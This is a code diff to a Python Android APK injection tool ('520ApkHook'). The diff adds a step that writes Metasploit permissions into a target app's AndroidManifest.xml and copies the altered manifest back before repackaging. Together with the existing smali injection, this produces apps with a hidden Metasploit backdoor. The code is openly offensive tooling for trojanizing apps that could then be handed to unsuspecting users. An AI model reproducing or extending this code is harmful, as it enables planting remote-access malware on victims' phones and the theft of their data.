@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
-
 import os
 import re
 import sys
@@ -40,7 +39,7 @@ LOGO = r'''
 '''
 
 def GetArguments():
-    parser = argparse.ArgumentParser(description=f'520ApkHook Apk注入工具 v1.1', formatter_class=RawTextHelpFormatter)
+    parser = argparse.ArgumentParser(description=f'520ApkHook Apk注入工具 v1.2', formatter_class=RawTextHelpFormatter)
     parser._optionals.title = f"参数说明"
 
     required_arguments = parser.add_argument_group(f'Required Arguments')
@@ -232,6 +231,33 @@ def InjectMsf2Apk():
     )
     Print.PrintLogo(f'\n修改代码: {ChangeCode}')
     Print.PrintSuccess(f'成功将msf的smali文件注入到App中，主要修改`{InjectAppLauncherActivitSmaliPath}`文件.')
+    
+
+def EditorAndroidManifest2():
+    Print.PrintInfo(f'准备注入msf权限到AndroidManifest.xml中...')
+    Inject = InjectMsf2App(OPTIONS)
+    DecodeAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'AndroidManifest_Decode.xml')
+    InjectMsfSmaliPath = ReslovePath(TestDirMsfUnSmaliPath, 'classes')
+
+    AppLauncherActivity = Inject.GetInjectAppLauncherActivit(androidmanifestfile=DecodeAndroidManifestPath)
+
+    Jar = JarCommand(OPTIONS)
+    AndroidManifestPath = ReslovePath(TestDirUnZipApkPath, 'AndroidManifest.xml')
+    NewAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'NewAndroidManifest.xml')
+
+    AndroidManifestOption = f''
+    for UsesPermission in OPTIONS['UsesPermission']:
+        AndroidManifestOption += f'-up {UsesPermission} '
+
+    Print.PrintStatus(
+        f'正在注入msf权限到AndroidManifest.xml中...',
+        Jar.ManifestEditor,
+        androidmanifestfile=AndroidManifestPath,
+        newandroidmanifestfile=NewAndroidManifestPath,
+        xmloptionscommand=AndroidManifestOption
+    )
+    Print.PrintDirTree(TestDirDexFile, 3)
+    Print.PrintSuccess(f'成功将msf权限注入App的AndroidManifest.xml，生成新文件`{NewAndroidManifestPath}`文件.')
 
 def EditorAndroidManifest():
     Print.PrintInfo(f'准备注入msf权限和壳信息到AndroidManifest.xml中...')
@@ -443,8 +469,13 @@ def InjectMsfNotEncryptCopy():
     )
     Print.PrintDirTree(TestDirUnZipApkPath, 2)
     Print.PrintSuccess(f'复制App的dex文件到Unzip目录成功，保存在`{TestDirUnZipApkPath}`')
+    
+    Print.PrintInfo(f'准备复制注入后的AndroidManifest.xml到App目录...')
+    InjectAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'NewAndroidManifest.xml')
+    AppAndroidManifestPath = ReslovePath(TestDirUnZipApkPath, 'AndroidManifest.xml')
+    copyfile(InjectAndroidManifestPath, AppAndroidManifestPath)
 
-
+#模式2的注入逻辑
 def InjectMsfNotEncrypt():
     Print.PrintRule('开始进行准备工作...', 'green bold')
     Print.PrintSuccess(f'获取到需要进行注入的app程序!')
@@ -457,6 +488,7 @@ def InjectMsfNotEncrypt():
     Print.PrintRule('开始进行注入工作...', 'blue bold')
     BakSmaliDexFile()
     InjectMsf2Apk()
+    EditorAndroidManifest2()
     RestoreApp()
     InjectMsfNotEncryptCopy()
     Print.PrintSuccess(f'注入工作已完成!\n')
